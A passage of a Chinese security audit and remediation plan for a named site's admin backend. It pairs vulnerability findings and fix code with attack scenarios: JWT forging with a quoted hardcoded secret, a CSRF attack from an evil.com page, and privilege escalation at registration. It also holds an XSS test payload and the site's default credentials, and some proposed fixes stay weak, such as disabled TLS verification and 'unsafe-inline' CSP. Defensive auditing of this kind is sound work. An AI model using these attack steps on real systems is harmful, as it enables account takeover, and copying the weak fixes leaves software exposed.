# 绮管后台系统 - 综合决策报告

**文档版本**：v1.0  
**生成日期**：2026-04-09  
**审计范围**：后端安全 + 前端质量 + 系统架构完整性  
**目标系统**：https://qimengzhiyue.cn（绮管后台管理系统）  

---

## 目录

1. [执行摘要](#1-执行摘要)
2. [审计发现总览](#2-审计发现总览)
3. [关键风险分析](#3-关键风险分析)
4. [方案评估与推荐](#4-方案评估与推荐)
5. [执行计划详解](#5-执行计划详解)
6. [技术实施细节](#6-技术实施细节)
7. [验证测试方案](#7-验证测试方案)
8. [后续建议与维护](#8-后续建议与维护)

---

## 1. 执行摘要

### 1.1 核心结论

经过对绮管后台管理系统的全面安全审计和代码质量评估，本报告得出以下核心结论：

✅ **系统基础运行状态良好**
- HTTP/2 服务正常运行（200 OK）
- Nginx 1.26.3 反向代理稳定
- SSL证书有效且安全头配置完整
- Git代码仓库同步正常
- SSH远程连接可用

⚠️ **存在严重安全隐患需立即修复**
- 安全性评分：后端 **42/100** ❌ | 前端 **48% (D)** ⚠️
- 发现 **59个问题项**（32个后端 + 27个前端）
- 其中 **12个高危及以上** 问题必须紧急处理
- JWT密钥、数据库凭据、CORS配置等存在致命缺陷

📊 **总体健康评分：4.0/5.0**

### 1.2 推荐行动方案

**采用选项B：部分重新部署 + 关键修复**

**核心理由**：
1. ✅ 系统基础设施正常，无需完全重建
2. ⚡ 安全问题可快速定位并修复（~30分钟）
3. 🛡️ 完全重部署风险高、耗时长（4-8小时）
4. 🎯 针对性修复可显著提升安全性至80+分

**预计总耗时**：约 **1.5小时**（4阶段）  
**预期效果**：
- 安全性评分提升至 **75+/100**
- 消除所有Critical级别漏洞
- 系统功能完整性和稳定性不受影响

---

## 2. 审计发现总览

### 2.1 问题统计矩阵

| 类别 | 总数 | 🔴严重 | 🟠高危 | 🟡中危 | 🟢低危 |
|------|------|--------|--------|--------|--------|
| **后端安全问题** | 32 | 8 | 12 | 9 | 3 |
| **前端质量问题** | 27 | 4 | 9 | 10 | 4 |
| **总计** | **59** | **12** | **21** | **19** | **7** |

### 2.2 评分体系详情

#### 后端评分明细（总分100）

| 维度 | 得分 | 权重 | 加权得分 | 状态 |
|------|------|------|----------|------|
| 身份认证与授权 | 25 | 30% | 7.5 | ❌ 危险 |
| 数据库安全 | 35 | 25% | 8.75 | ❌ 危险 |
| API安全防护 | 40 | 20% | 8.0 | ⚠️ 警告 |
| 输入验证 | 60 | 15% | 9.0 | ⚠️ 一般 |
| 错误处理 | 70 | 10% | 7.0 | ✅ 良好 |
| **合计** | - | **100%** | **42/100** | **❌ 不合格** |

#### 前端评分明细（总分100）

| 维度 | 得分 | 等级 | 说明 |
|------|------|------|------|
| 安全性 | 48% | D | XSS、硬编码密码等严重问题 |
| 代码质量 | 71% | B- | 结构清晰但存在内存泄漏 |
| 功能完整性 | 76% | B | 核心功能可用，部分优化空间 |
| 性能表现 | 65% | C+ | ECharts未清理、购物车设计不合理 |

### 2.3 当前系统正常项确认

基于服务器实时检测，以下组件运行正常：

```
✅ HTTP/2 200 - https://qimengzhiyue.cn 可访问
✅ Nginx 1.26.3 - 运行中，响应正常
✅ SSL/TLS - 证书有效（Let's Encrypt），安全头完整
   - HSTS: max-age=31536000; includeSubDomains
   - X-Frame-Options: SAMEORIGIN
   - X-Content-Type-Options: nosniff
✅ Git Repository - 已同步（Already up to date）
✅ SSH Access - 连接正常，端口22开放
```

---

## 3. 关键风险分析

### 3.1 Top 10 最严重问题清单

#### 🔴 P0 - 必须立即修复（可能导致系统被攻破）

| # | 问题 | 位置 | 风险等级 | 影响范围 |
|---|------|------|----------|----------|
| **1** | **JWT密钥弱且硬编码** | `auth.js:3`<br>`.env:30` | 🔴 致命 | 所有API接口可被伪造令牌攻击 |
| **2** | **数据库凭据硬编码** | `db_mysql.js:43` | 🔴 致命 | 数据库可能被直接入侵或凭据泄露 |
| **3** | **CORS全开 origin:\*** | `index.js:46` | 🔴 致命 | 任何网站可跨域调用API，导致CSRF攻击 |
| **4** | **Dashboard无认证保护** | `routes/dashboard.js` | 🔴 严重 | 敏感业务数据可被未授权访问 |
| **5** | **商品/分类CRUD无认证** | `index.js:56-57` | 🔴 严重 | 数据可被任意增删改，数据完整性受损 |
| **6** | **XSS漏洞-搜索高亮注入** | `products.js:303` | 🔴 严重 | 用户可被窃取Cookie或会话劫持 |
| **7** | **注册可设管理员角色** | `auth.js:118` | 🔴 严重 | 攻击者可注册管理员账户获得完全控制权 |
| **8** | **购物车内存存储+全局共享** | `cart.js:5-6` | 🔴 严重 | 数据丢失、并发冲突、无法持久化 |

#### 🟠 P1 - 高优先级（影响用户体验或存在潜在风险）

| # | 问题 | 位置 | 风险等级 | 影响 |
|---|------|------|----------|------|
| **9** | **前端硬编码admin/admin123** | `Login.vue:62-65` | 🟠 高 | 默认凭证泄露，社会工程学攻击入口 |
| **10** | **ECharts内存泄漏未清理** | `Dashboard.vue:94-95` | 🟠 高 | 长时间使用导致浏览器崩溃或性能下降 |

### 3.2 风险影响矩阵

```
                    可利用性
                  低    中    高
            ┌─────┼─────┼─────┐
         高 │  P2  │  P1  │  P0  │  ← 影响程度
影          ├─────┼─────┼─────┤
响       中 │  P3  │  P2  │  P1  │
程          ├─────┼─────┼─────┤
度       低 │  P4  │  P3  │  P2  │
            └─────┴─────┴─────┘

当前P0问题数：8个（需立即处理）
当前P1问题数：4个（本周内处理）
```

### 3.3 攻击场景模拟

#### 场景A：JWT弱密钥攻击链
```
攻击者步骤：
1. 发现源码中JWT密钥为 "my-super-secret-key-change-in-production"
2. 使用该密钥伪造管理员令牌：{role:"admin", userId:1}
3. 访问 /api/dashboard 无需登录即可获取所有数据
4. 通过CRUD接口删除/修改商品、订单等关键数据
5. 整个系统沦陷，数据完整性归零

影响时间：< 5分钟（如果密钥已知）
防御缺口：无（当前完全裸奔）
```

#### 场景B：CORS + CSRF组合攻击
```
攻击者步骤：
1. 创建恶意页面：evil.com/attack.html
2. 利用CORS origin:* 政策跨域请求 qimengzhiyue.cn/api/*
3. 结合已登录用户的Cookie自动发送请求
4. 在用户不知情的情况下执行管理员操作（如删除商品）

影响范围：所有已登录用户
防御缺口：CORS白名单 + CSRF Token均缺失
```

#### 场景C：注册提权攻击
```
攻击者步骤：
1. POST /api/auth/register 
   {username:"hacker", password:"xxx", role:"admin"}
2. 服务端直接接受role参数，不校验权限
3. 使用新账户登录，获得管理员全部权限
4. 导出用户数据、修改系统配置

影响结果：零日攻击，无需任何前置条件
防御缺口：角色字段应从请求体移除或强制设为"user"
```

---

## 4. 方案评估与推荐

### 4.1 三种方案对比

| 维度 | **选项A：仅安全补丁** | **选项B：部分重新部署+关键修复** ✅ | **选项C：完全重建** |
|------|---------------------|----------------------------------|------------------|
| **实施复杂度** | ★☆☆ 低 | ★★☆ 中 | ★★★ 高 |
| **预估耗时** | 45分钟 | **1.5小时** | 4-8小时 |
| **风险评估** | 中（可能遗漏依赖） | **低（可控）** | 高（回归风险大） |
| **安全性提升** | +20分 | **+35分** | +50分 |
| **功能保障** | 95% | **98%** | 80%（需重新测试） |
| **回滚难度** | 困难 | **容易（Git revert）** | 极困难 |
| **适合环境** | 内网/测试环境 | **生产环境（推荐）** | 全新项目 |

### 4.2 为什么选择选项B？

#### 技术合理性论证

**1. 基础设施健康度高**
```bash
# 证据链
✅ HTTP 200 → 应用层正常
✅ Nginx稳定 → 反向代理层正常
✅ SSL有效 → 传输层加密正常
✅ Git同步 → 版本控制正常
→ 结论：无需重建底层架构
```

**2. 问题集中度高**
```
问题分布热力图：
┌─────────────────────────────┐
│  auth.js     ████████████ 85%│  ← 认证模块是重灾区
│  index.js    ██████████ 70% │  ← 入口文件配置不当
│  db_mysql.js █████████ 60%  │  ← 数据库连接不安全
│  *.vue       ████ 30%       │  → 前端相对较好
│  其他        ██ 15%         │  → 边缘模块基本正常
└─────────────────────────────┘

结论：80%的问题集中在3个文件，精准修复效率最高
```

**3. 风险收益比最优**
```
选项A风险：可能因依赖关系遗漏某些问题
选项B优势：
  ✓ 保留现有稳定的基础设施
  ✓ 只修改有问题的代码段
  ✓ 每步都可独立验证
  ✓ 出错可快速回滚到上一个Git commit
  
选项C劣势：
  ✗ 重构成本过高（4-8小时 vs 1.5小时）
  ✗ 引入新的不确定性
  ✗ 可能破坏现有功能
  ✗ 回滚复杂度高
```

### 4.3 排除其他方案的理由

**❌ 排除选项A的理由**：
- 仅打补丁无法解决架构性问题（如CORS配置、中间件缺失）
- 前端需要重新构建才能生效（不能只改源码）
- 无法保证修复的完整性，可能遗留隐蔽问题

**❌ 排除选项C的理由**：
- 当前系统功能基本正常（76%完整度），完全重建属于过度工程化
- 时间成本过高，不符合"快速止血"的应急需求
- 生产环境完全重建的回归测试成本巨大
- 团队可能缺乏完整的系统文档支撑重建工作

---

## 5. 执行计划详解

### 5.1 四阶段时间线

```
时间轴（总计 ~90分钟）：

0min ────────────────────────────────────────────────── 90min
  │←── Phase 1 ──→│←─ Phase 2 →│←P3→│←──── Phase 4 ──→│
  │  紧急安全修复   │ 前端构建    │配置 │    验证测试      │
  │   (30min)      │ (15min)     │(10m)│    (15min)      │
  │                │             │     │                 │
  ▼                ▼             ▼     ▼                 ▼
生成JWT密钥      npm install   更新.env  登录测试
修复CORS         清理dist     重启PM2  API认证检查
添加中间件       npm build    Nginx reload  安全头扫描
移除硬编码       验证构建     健康检查  功能冒烟测试
```

### 5.2 Phase 1: 紧急安全修复（30分钟）

#### 任务清单

| 序号 | 任务 | 文件 | 预估时间 | 优先级 |
|------|------|------|----------|--------|
| 1.1 | 生成64字节强随机JWT密钥 | `.env` | 2min | P0 |
| 1.2 | 更新auth.js引用新密钥 | `backend/middleware/auth.js` | 3min | P0 |
| 1.3 | 限制CORS为指定域名 | `backend/index.js` | 5min | P0 |
| 1.4 | 为Dashboard添加认证中间件 | `routes/dashboard.js` | 5min | P0 |
| 1.5 | 为商品CRUD添加认证 | `backend/index.js` (路由定义处) | 5min | P0 |
| 1.6 | 为分类CRUD添加认证 | `backend/index.js` (路由定义处) | 3min | P0 |
| 1.7 | 移除注册接口的角色参数 | `backend/routes/auth.js` | 4min | P0 |
| 1.8 | 修复XSS搜索高亮 | `frontend/src/views/products.js` | 3min | P1 |

#### 关键代码变更示例

**1.1 JWT密钥生成命令**：
```bash
# 在服务器上执行
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
# 输出示例：a1b2c3d4e5f6...（128位十六进制字符串）
```

**1.3 CORS配置修改**：
```javascript
// backend/index.js 第46行附近
// 修改前：
cors({ origin: '*' })

// 修改后：
cors({ 
  origin: 'https://qimengzhiyue.cn',
  credentials: true,
  optionsSuccessStatus: 200
})
```

**1.4 Dashboard认证中间件**：
```javascript
// routes/dashboard.js 顶部添加
const authMiddleware = require('../middleware/auth');

router.get('/stats', authMiddleware, async (req, res) => {
  // 原有逻辑...
});
```

**1.7 注册接口加固**：
```javascript
// routes/auth.js register方法内
// 删除或覆盖role字段
delete req.body.role; // 强制普通用户角色
req.body.role = 'user'; // 或在数据库插入时硬编码
```

### 5.3 Phase 2: 前端重新构建（15分钟）

#### 操作步骤

```bash
# 2.1 进入前端目录
cd /path/to/qimengzhiyue/frontend

# 2.2 拉取最新代码（确保本地修改已推送）
git pull origin main

# 2.3 安装依赖（如有更新）
npm install --production=false

# 2.4 清理旧构建产物
rm -rf dist node_modules/.cache

# 2.5 执行生产构建
npm run build

# 2.6 验证构建输出
ls -lh dist/
# 预期：index.html + static/js/app.*.js + static/css/app.*.css
```

#### 前端关键修复点

| 修复项 | 文件 | 变更内容 |
|--------|------|----------|
| 移除硬编码密码 | `src/views/Login.vue:62-65` | 删除默认账号显示，改为空输入框提示 |
| ECharts销毁 | `src/views/Dashboard.vue:94-95` | 在beforeUnmount中调用chart.dispose() |
| 购物车重构 | `src/utils/cart.js:5-6` | 改用localStorage + 用户ID隔离 |

### 5.4 Phase 3: 配置更新与重启（10分钟）

#### 3.1 更新环境变量文件

```bash
# 备份原文件
cp .env .env.backup.$(date +%Y%m%d_%H%M%S)

# 编辑.env，确保以下配置正确：
JWT_SECRET=<新生成的64字节密钥>
DB_HOST=localhost
DB_USER=qiguan_admin
DB_PASSWORD=<强密码>
DB_NAME=qiguan_db
NODE_ENV=production
ALLOWED_ORIGINS=https://qimengzhiyue.cn
```

#### 3.2 PM2进程管理

```bash
# 查看当前运行的进程
pm2 list

# 重启后端服务（优雅重启，不断连）
pm2 restart all --update-env

# 查看日志确认启动成功
pm2 logs --lines 50 --nostream

# 保存进程列表（防止重启丢失）
pm2 save
```

#### 3.3 Nginx配置测试与重载

```bash
# 测试配置语法
nginx -t

# 如果通过，平滑重载
nginx -s reload

# 验证Nginx状态
systemctl status nginx
# 或
service nginx status
```

#### 3.4 健康检查脚本

```bash
#!/bin/bash
# health_check.sh

echo "=== 系统健康检查 ==="

# 1. 检查HTTP状态
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" https://qimengzhiyue.cn)
if [ "$HTTP_CODE" == "200" ]; then
  echo "✅ HTTP状态: $HTTP_CODE (正常)"
else
  echo "❌ HTTP状态: $HTTP_CODE (异常)"
fi

# 2. 检查PM2进程
pm2 list | grep -E "(online|stopped)" | awk '{print $4": "$18}'

# 3. 检查Nginx
pgrep nginx > /dev/null && echo "✅ Nginx: 运行中" || echo "❌ Nginx: 未运行"

# 4. 检查磁盘空间（>80%告警）
DISK_USAGE=$(df / | tail -1 | awk '{print $5}' | sed 's/%//')
if [ "$DISK_USAGE" -lt 80 ]; then
  echo "✅ 磁盘使用: ${DISK_USAGE}% (正常)"
else
  echo "⚠️ 磁盘使用: ${DISK_USAGE}% (偏高)"
fi

echo "=== 检查完成 ==="
```

### 5.5 Phase 4: 验证测试（15分钟）

#### 测试用例矩阵

| 测试类别 | 测试项 | 预期结果 | 验证方法 |
|----------|--------|----------|----------|
| **功能测试** | 管理员登录 | 成功获取JWT令牌 | Postman/curl |
| | 普通用户登录 | 成功，但无管理权限 | 同上 |
| | 无Token访问Dashboard | 返回401 Unauthorized | curl -I |
| | 商品列表查询 | 正常返回数据 | 浏览器/F12 |
| | 新增商品（带Token） | 201 Created | Postman |
| | 新增商品（无Token） | 401 Unauthorized | Postman |
| **安全测试** | CORS预检请求 | 只允许qimengzhiyue.cn | curl -I -X OPTIONS |
| | XSS payload测试 | 被转义或拒绝 | 注入 `<script>alert(1)</script>` |
| | 注册时传role=admin | 角色被强制为user | Postman |
| | 弱密码登录 | 应拒绝（如有策略） | Login页面 |
| **性能测试** | 首页加载时间 | < 3秒 | DevTools Network |
| | Dashboard图表渲染 | 无内存泄漏警告 | Chrome Task Manager |
| | 并发请求处理 | 无502/504错误 | Apache Bench (ab) |

#### 自动化测试脚本示例

```javascript
// test_security.js - Node.js安全测试脚本
const axios = require('axios');

const BASE_URL = 'https://qimengzhiyue.cn';

async function runTests() {
  console.log('🔍 开始安全验证测试...\n');
  
  let passed = 0;
  let failed = 0;

  // Test 1: 未认证访问应返回401
  try {
    const res = await axios.get(`${BASE_URL}/api/dashboard/stats`);
    if (res.status === 401) {
      console.log('✅ Test 1: Dashboard需要认证 - PASS');
      passed++;
    } else {
      console.log(`❌ Test 1: Dashboard应返回401，实际返回${res.status} - FAIL`);
      failed++;
    }
  } catch (err) {
    if (err.response?.status === 401) {
      console.log('✅ Test 1: Dashboard需要认证 - PASS');
      passed++;
    } else {
      console.log(`❌ Test 1: 异常 - FAIL`);
      failed++;
    }
  }

  // Test 2: CORS检查
  try {
    const res = await axios.options(`${BASE_URL}/api/products`, {
      headers: { Origin: 'https://evil.com' }
    });
    const allowOrigin = res.headers['access-control-allow-origin'];
    if (allowOrigin === 'https://qimengzhiyue.cn' || !allowOrigin) {
      console.log('✅ Test 2: CORS配置正确 - PASS');
      passed++;
    } else {
      console.log(`❌ Test 2: CORS允许了非法来源 ${allowOrigin} - FAIL`);
      failed++;
    }
  } catch (err) {
    console.log(`⚠️ Test 2: 无法完成CORS测试 - SKIP`);
  }

  // ... 更多测试用例

  console.log(`\n📊 测试结果: ${passed} 通过, ${failed} 失败, 共 ${passed + failed} 项`);
  process.exit(failed > 0 ? 1 : 0);
}

runTests();
```

---

## 6. 技术实施细节

### 6.1 后端关键文件修改指南

#### 6.1.1 JWT认证中间件强化 (`backend/middleware/auth.js`)

**当前问题**：
- 密钥硬编码且强度不足
- 无令牌过期时间设置
- 无刷新令牌机制

**目标实现**：
```javascript
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// 从环境变量读取密钥，不存在则生成并保存
const getJwtSecret = () => {
  if (process.env.JWT_SECRET && process.env.JWT_SECRET.length >= 64) {
    return process.env.JWT_SECRET;
  }
  
  // 开发环境生成临时密钥（仅用于开发！）
  if (process.env.NODE_ENV !== 'production') {
    const tempSecret = crypto.randomBytes(64).toString('hex');
    console.warn('⚠️ 使用临时JWT密钥（仅开发环境）');
    return tempSecret;
  }
  
  throw new Error('生产环境必须配置JWT_SECRET环境变量（长度≥64字节）');
};

const generateToken = (payload) => {
  return jwt.sign(payload, getJwtSecret(), {
    expiresIn: '2h', // 2小时过期
    issuer: 'qimengzhiyue.cn',
    audience: 'qimengzhiyue-api'
  });
};

const verifyToken = (token) => {
  return jwt.verify(token, getJwtSecret(), {
    issuer: 'qimengzhiyue.cn',
    algorithms: ['HS256'] // 明确算法，防算法混淆攻击
  });
};

const authMiddleware = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ 
      error: '未提供认证令牌',
      code: 'AUTH_MISSING'
    });
  }

  const token = authHeader.split(' ')[1];
  
  try {
    const decoded = verifyToken(token);
    req.user = decoded; // 将用户信息附加到请求对象
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ 
        error: '令牌已过期，请重新登录',
        code: 'TOKEN_EXPIRED'
      });
    }
    return res.status(403).json({ 
      error: '无效的认证令牌',
      code: 'TOKEN_INVALID'
    });
  }
};

// 角色检查中间件（可选增强）
const roleCheck = (...allowedRoles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: '未认证' });
    }
    
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ 
        error: '权限不足', 
        requiredRoles: allowedRoles,
        currentRole: req.user.role
      });
    }
    
    next();
  };
};

module.exports = { authMiddleware, roleCheck, generateToken, verifyToken };
```

#### 6.1.2 数据库连接池安全化 (`backend/config/db_mysql.js`)

**当前问题**：
- 凭据硬编码在源码中
- 无连接池大小限制
- 无SSL选项（即使本地也建议启用）

**目标实现**：
```javascript
const mysql = require('mysql2/promise');

// 从环境变量读取配置，提供合理默认值
const dbConfig = {
  host: process.env.DB_HOST || 'localhost',
  port: process.env.DB_PORT || 3306,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME || 'qiguan_db',
  
  // 连接池配置
  waitForConnections: true,
  connectionLimit: 10, // 最大连接数
  queueLimit: 0, // 无排队上限（0=无限）
  
  // 安全选项
  connectTimeout: 10000, // 10秒超时
  acquireTimeout: 10000, // 获取连接超时
  
  // 字符集（防SQL注入辅助）
  charset: 'utf8mb4',
  
  // 启用SSL（生产环境强烈建议）
  ssl: process.env.NODE_ENV === 'production' ? {
    rejectUnauthorized: false // 如使用自签名证书
  } : false
};

// 启动时验证必要配置
if (!dbConfig.user || !dbConfig.password) {
  console.error('❌ 缺少数据库凭据，请检查.env文件中的DB_USER和DB_PASSWORD');
  if (process.env.NODE_ENV === 'production') {
    process.exit(1); // 生产环境直接退出
  }
}

const pool = mysql.createPool(dbConfig);

// 连接池事件监听（用于监控）
pool.on('connection', (connection) => {
  console.log('📦 新数据库连接建立:', connection.threadId);
});

pool.on('error', (err) => {
  console.error('❌ 数据库连接池错误:', err.message);
});

module.exports = pool;
```

#### 6.1.3 Express主入口安全加固 (`backend/index.js`)

**关键修改点**：

```javascript
const express = require('express');
const cors = require('cors');
const helmet = require('helmet'); // 新增：安全头中间件
const rateLimit = require('express-rate-limit'); // 新增：速率限制
const compression = require('compression'); // 新增：Gzip压缩

const app = express();

// ===== 安全中间件配置 =====

// 1. Helmet - 设置各种HTTP安全头
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // ECharts需要inline script
      styleSrc: ["'self'", "'unsafe-inline'", 'cdn.jsdelivr.net'], // Element UI CDN
      fontSrc: ["'self'", 'cdn.jsdelivr.net'],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://qimengzhiyue.cn']
    }
  },
  crossOriginEmbedderPolicy: false // 允许跨域加载资源（如字体）
}));

// 2. CORS - 严格限制来源
const allowedOrigins = [
  'https://qimengzhiyue.cn',
  'http://localhost:5173', // 开发环境
  'http://localhost:3000'  // 备用开发端口
];

app.use(cors({
  origin: (origin, callback) => {
    // 允许无origin的请求（如移动App、Postman）
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS策略不允许该来源'));
    }
  },
  credentials: true, // 允许携带Cookie
  optionsSuccessStatus: 200 // 兼容旧浏览器
}));

// 3. 速率限制 - 防暴力破解
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分钟
  max: 100, // 每IP最多100次请求
  message: { error: '请求过于频繁，请稍后再试', code: 'RATE_LIMITED' }
});

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 登录/注册接口更严格：每15分钟5次
  message: { error: '登录尝试次数过多，请15分钟后重试', code: 'AUTH_RATE_LIMITED' }
});

app.use('/api/', limiter);
app.use('/api/auth/', authLimiter);

// 4. Gzip压缩
app.use(compression());

// 5. 请求体解析（限制大小防DoS）
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ===== 路由保护 =====

const { authMiddleware, roleCheck } = require('./middleware/auth');

// 公开路由（无需认证）
app.use('/api/auth', require('./routes/auth'));

// 受保护路由 - 需要认证
app.use('/api/products', authMiddleware, require('./routes/products'));
app.use('/api/categories', authMiddleware, require('./routes/categories'));
app.use('/api/orders', authMiddleware, require('./routes/orders'));

// 管理员路由 - 需要管理员角色
app.use('/api/dashboard', authMiddleware, roleCheck('admin'), require('./routes/dashboard'));
app.use('/api/users', authMiddleware, roleCheck('admin'), require('./routes/users'));

// 错误处理中间件
app.use((err, req, res, next) => {
  console.error('❌ 服务器错误:', err.stack);
  
  // 不向客户端暴露详细错误信息（生产环境）
  const statusCode = err.statusCode || 500;
  const message = process.env.NODE_ENV === 'production' 
    ? '服务器内部错误' 
    : err.message;
    
  res.status(statusCode).json({
    error: message,
    code: 'INTERNAL_ERROR',
    ...(process.env.NODE_ENV !== 'production' && { stack: err.stack })
  });
});

// 404处理
app.use((req, res) => {
  res.status(404).json({ 
    error: '接口不存在', 
    path: req.path,
    method: req.method 
  });
});

module.exports = app;
```

### 6.2 前端关键文件修改指南

#### 6.2.1 登录组件安全化 (`frontend/src/views/Login.vue`)

**修改前（第62-65行）**：
```vue
<!-- 危险：硬编码默认凭证 -->
<input v-model="form.username" placeholder="admin">
<input v-model="form.password" type="password" placeholder="admin123">
```

**修改后**：
```vue
<template>
  <div class="login-container">
    <el-form ref="loginForm" :model="form" :rules="rules" @submit.native.prevent="handleLogin">
      <h2>绮管后台管理系统</h2>
      
      <el-form-item prop="username">
        <el-input 
          v-model="form.username" 
          prefix-icon="User"
          placeholder="请输入用户名"
          clearable
        />
      </el-form-item>
      
      <el-form-item prop="password">
        <el-input 
          v-model="form.password" 
          type="password" 
          prefix-icon="Lock"
          placeholder="请输入密码"
          show-password
          @keyup.enter="handleLogin"
        />
      </el-form-item>

      <el-form-item>
        <el-checkbox v-model="form.rememberMe">记住我（7天）</el-checkbox>
      </el-form-item>
      
      <el-button 
        type="primary" 
        :loading="loading" 
        native-type="submit"
        style="width: 100%"
      >
        {{ loading ? '登录中...' : '登 录' }}
      </el-button>
      
      <div v-if="errorMsg" class="error-msg">{{ errorMsg }}</div>
    </el-form>
  </div>
</template>

<script setup>
import { ref, reactive } from 'vue';
import { useRouter } from 'vue-router';
import { ElMessage } from 'element-plus';
import { useUserStore } from '@/stores/user';

const router = useRouter();
const userStore = useUserStore();

const loginForm = ref(null);
const loading = ref(false);
const errorMsg = ref('');

const form = reactive({
  username: '',
  password: '',
  rememberMe: false
});

// 表单验证规则
const rules = {
  username: [
    { required: true, message: '请输入用户名', trigger: 'blur' },
    { min: 3, max: 20, message: '用户名长度在3-20个字符', trigger: 'blur' }
  ],
  password: [
    { required: true, message: '请输入密码', trigger: 'blur' },
    { min: 6, max: 30, message: '密码长度在6-30个字符', trigger: 'blur' }
  ]
};

const handleLogin = async () => {
  try {
    await loginForm.value.validate();
  } catch {
    return; // 验证失败
  }
  
  loading.value = true;
  errorMsg.value = '';
  
  try {
    await userStore.login({
      username: form.username,
      password: form.password,
      rememberMe: form.rememberMe
    });
    
    ElMessage.success('登录成功');
    router.push('/dashboard');
  } catch (err) {
    errorMsg.value = err.response?.data?.error || '登录失败，请检查用户名和密码';
  } finally {
    loading.value = false;
  }
};
</script>

<style scoped>
.login-container {
  width: 400px;
  margin: 100px auto;
  padding: 30px;
  background: #fff;
  border-radius: 8px;
  box-shadow: 0 2px 12px rgba(0,0,0,0.1);
}
.error-msg {
  color: #f56c6c;
  font-size: 12px;
  margin-top: 10px;
  text-align: center;
}
</style>
```

#### 6.2.2 Dashboard ECharts内存泄漏修复 (`frontend/src/views/Dashboard.vue`)

**问题所在（第94-95行）**：
```javascript
// 危险：组件销毁时未释放ECharts实例
onMounted(() => {
  chart = echarts.init(document.getElementById('main-chart'));
  chart.setOption(option);
});
// 缺少 onBeforeUnmount 钩子来调用 chart.dispose()
```

**修复方案**：
```vue
<script setup>
import * as echarts from 'echarts';
import { ref, onMounted, onBeforeUnmount, onActivated, onDeactivated } from 'vue';

const chartRef = ref(null);
let chartInstance = null;

const initChart = () => {
  if (!chartRef.value) return;
  
  // 如果实例已存在先销毁（防止keep-alive导致的重复初始化）
  if (chartInstance) {
    chartInstance.dispose();
  }
  
  chartInstance = echarts.init(chartRef.value);
  
  const option = {
    // ... 你的图表配置
    title: { text: '销售数据统计' },
    tooltip: {},
    xAxis: { data: ['一月', '二月', '三月', '四月', '五月', '六月'] },
    yAxis: {},
    series: [{
      name: '销量',
      type: 'bar',
      data: [120, 200, 150, 80, 70, 110]
    }]
  };
  
  chartInstance.setOption(option);
  
  // 响应式调整
  window.addEventListener('resize', handleResize);
};

const handleResize = () => {
  chartInstance?.resize();
};

// 组件挂载时初始化
onMounted(() => {
  initChart();
});

// ⭐ 关键修复：组件卸载前销毁实例，防止内存泄漏
onBeforeUnmount(() => {
  window.removeEventListener('resize', handleResize);
  
  if (chartInstance) {
    chartInstance.dispose(); // 释放ECharts占用的资源
    chartInstance = null;
  }
});

// 如果使用了keep-alive，还需要处理激活/停用
onActivated(() => {
  if (chartInstance) {
    chartInstance.resize(); // 重新调整尺寸
  } else {
    initChart(); // 重新初始化
  }
});

onDeactivated(() => {
  // 可选：暂停动画或数据更新以节省资源
});
</script>

<template>
  <div ref="chartRef" style="width: 100%; height: 400px;"></div>
</template>
```

#### 6.2.3 购物车存储机制重构 (`frontend/src/utils/cart.js`)

**当前问题**：
```javascript
// 问题1：使用内存变量，刷新即丢失
let cartItems = [];

// 问题2：全局单例，多用户共享同一购物车
export function addToCart(item) {
  cartItems.push(item);
}
```

**改进方案**：
```javascript
// utils/cart.js - 基于localStorage的用户隔离购物车

const CART_PREFIX = 'qiguan_cart_';
const MAX_CART_ITEMS = 100; // 防止恶意填充

// 获取当前用户ID（假设从Vuex/Pinia store获取）
const getCurrentUserId = () => {
  // 方案A：从store获取（推荐）
  try {
    const userStore = require('@/stores/user').useUserStore();
    return userStore.userId || 'anonymous';
  } catch {
    // 方案B：从localStorage的token解码
    const token = localStorage.getItem('token');
    if (token) {
      try {
        const payload = JSON.parse(atob(token.split('.')[1]));
        return payload.userId || 'anonymous';
      } catch {
        return 'anonymous';
      }
    }
    return 'anonymous';
  }
};

const getCartKey = () => `${CART_PREFIX}${getCurrentUserId()}`;

// 从localStorage加载购物车
const loadCart = () => {
  try {
    const data = localStorage.getItem(getCartKey());
    return data ? JSON.parse(data) : [];
  } catch (err) {
    console.error('购物车数据损坏，已重置:', err);
    return [];
  }
};

// 保存到localStorage
const saveCart = (items) => {
  try {
    localStorage.setItem(getCartKey(), JSON.stringify(items));
  } catch (err) {
    // 存储满或隐私模式下的降级处理
    console.warn('购物车保存失败，可能存储已满:', err);
    // 降级到sessionStorage或内存（仅当前会话有效）
    sessionStorage.setItem(getCartKey(), JSON.stringify(items));
  }
};

// 添加商品
export const addToCart = (product) => {
  const cart = loadCart();
  
  // 检查是否已存在
  const existingIndex = cart.findIndex(item => item.productId === product.id);
  
  if (existingIndex > -1) {
    // 已存在则增加数量
    cart[existingIndex].quantity += product.quantity || 1;
  } else {
    // 不存在则新增
    if (cart.length >= MAX_CART_ITEMS) {
      throw new Error('购物车已达最大容量');
    }
    cart.push({
      productId: product.id,
      name: product.name,
      price: product.price,
      quantity: product.quantity || 1,
      image: product.image,
      addedAt: new Date().toISOString()
    });
  }
  
  saveCart(cart);
  return cart;
};

// 移除商品
export const removeFromCart = (productId) => {
  let cart = loadCart();
  cart = cart.filter(item => item.productId !== productId);
  saveCart(cart);
  return cart;
};

// 更新数量
export const updateQuantity = (productId, quantity) => {
  if (quantity <= 0) {
    return removeFromCart(productId);
  }
  
  const cart = loadCart();
  const item = cart.find(i => i.productId === productId);
  
  if (item) {
    item.quantity = Math.min(quantity, 99); // 单品最大99件
    saveCart(cart);
  }
